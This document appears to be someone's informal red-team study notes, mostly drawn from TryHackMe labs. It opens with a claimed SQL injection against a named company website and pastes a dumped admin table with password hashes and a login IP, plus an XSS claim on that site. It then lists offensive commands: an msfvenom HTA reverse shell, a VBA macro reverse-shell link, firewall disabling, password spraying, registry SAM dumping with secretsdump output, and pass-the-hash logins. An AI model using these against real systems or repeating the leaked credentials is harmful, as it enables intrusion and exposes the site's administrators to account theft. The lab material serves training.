http://aminter.co.th/product2.php?id=1 - Have a SQL injection
With SQLmap I can get databases
Dump:
admin_id,admin_tel,admin_name,admin_pass,admin_email,admin_active,admin_surname,admin_ip_login,admin_username,admin_date_login,admin_date_create,admin_date_update,admin_admin_create,admin_admin_update
17,<blank>,root,cccc56525135d9fe92937ba95ea051,<blank>,Y,fundan,45.113.165.33,hiddenwiki,1665077725,NULL,1626799363,NULL,NULL
18,111,root,ea3f63fc1f898c518bdb8948191905,11@12.com,Y,1,<blank>,root,NULL,NULL,1665080826,NULL,17

Also http://aminter.co.th/signin.php have XSS vulnerability
https://vk.com/video/@c0mrade_pentest?z=video300869425_456239793%2Fpl_300869425_-2



[+] API [+]
https://github.com/arainho/awesome-api-security




						Types of reconnaissance activities
WHOIS and DNS-based reconnaissance
Advanced searching
Searching by image
Google Hacking
Specialized search engines
Recon-ng
Maltego



Passive test
	whois
	dig, nslookup, host
	traceroute/tracert



Google OSINT


"search phrase"	Find results with exact search phrase
OSINT filetype:pdf	Find files of type PDF related to a certain term.
salary site:blog.tryhackme.com	Limit search results to a specific site.
pentest -site:example.com	Exclude a specific site from results
walkthrough intitle:TryHackMe	Find pages with a specific term in the page title.
challenge inurl:tryhackme	Find pages with a specific term in the page URL.

OSINT sites/tools
shodan, censys, recon-ng, maltego
full hunt


Red Team Rules

Activities:
• Reconnaissance
• Access Types
• Phishing
• Physical and social engineering
• Positioning
• Assumed breach scenario
• Impact

Explicit Restrictions:
• Use of white cards are strictly prohibited
• Any form of DDoS or DoS is prohibited
• Attacks against any system within 192.168.1.0/24 is prohibited
Authorized Target Space:
• 10.0.4.0/22
• *.bethechange.xyz, *.globalenterprises.thm






Below is an example of the CONOPS for a mature organization with a strong security posture.

Example 1 - Holo Enterprises:

CONOPS:

Holo Enterprises has hired TryHackMe as an external contractor to conduct a month-long network infrastructure assessment and security posture. The campaign will utilize an assumed breach model starting in Tier 3 infrastructure. Operators will progressively conduct reconnaissance and attempt to meet objectives to be determined. If defined goals are not met, the red cell will move and escalate privileges within the network laterally. Operators are also expected to execute and maintain persistence to sustain for a period of three weeks. A trusted agent is expected to intervene if the red cell is identified or burned by the blue cell throughout the entirety of the engagement. The last engagement day is reserved for clean-up and remediation and consultation with the blue and white cell.

The customer has requested the following training objectives: assess th




https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf
https://www.crest-approved.org/membership/tiber-eu/



TTPs  тактики техники процедуры
https://attack.mitre.org



								An HTML Application (HTA)
HTA Reverse Connection

user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta



Malicious HTA via Metasploit
msf6 > use exploit/windows/misc/hta_server


https://raw.githubusercontent.com/JohnWoodman/VBA-Macro-Reverse-Shell/main/VBA-Reverse-Shell.vba


			Passwowrd Attacks
https://default-password.info
crunch 2 2 01234abcd -o crunch.txt
git clone https://github.com/therodri2/username_generator.git

1) echo "John Smith" > users.lst
2) user@thm$ python3 username_generator.py -w users.lst


CeWL (Custom Word List generator, то есть генератор пользовательского списка слов) - это приложение на основе Ruby, которое просматривает указанный URL-адрес до указанной глубины и возвращает список слов, который затем может использоваться для взломщиков паролей, таких как John the Ripper. При желании CeWL может переходить по внешним ссылкам


Spray Attack
	Outlook web access (OWA) portal
	Tools:

	SprayingToolkit (atomizer.py)
	MailSniper
	SMB
	Tool: Metasploit (auxiliary/scanner/smb/smb_login)




POST exploitation (The lay of the land)

systeminfo | findstr Domain


BUILTIN\Administrator	Local admin access on a domain controller
Domain Admins	Administrative access to all resources in the domain
Enterprise Admins	Available only in the forest root
Schema Admins	Capable of modifying domain/forest; useful for red teamers
Server Operators	Can manage domain servers
Account Operators	Can manage users that are not in privileged groups


Active Directory (AD) Enum

Get-ADUser  -Filter *
Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"



Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct #Get AV on machine
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False	#Get firewall settings on machine
Get-Service WinDefend


wmic service where "name like 'THM Demo'" get Name,PathName #get name,PathName

Get-Process -Name thm-demo # get proccess id

netstat -noa |findstr "LISTENING" |findstr "3212"


AD SCAN - Puple Knight





net localgroup "Remote Management Users" thmuser1 /add

evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
reg save hklm\system system.bak
reg save hklm\sam sam.bak
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
Pass the Hash
evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3





SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
secedit /export /cfg config.inf
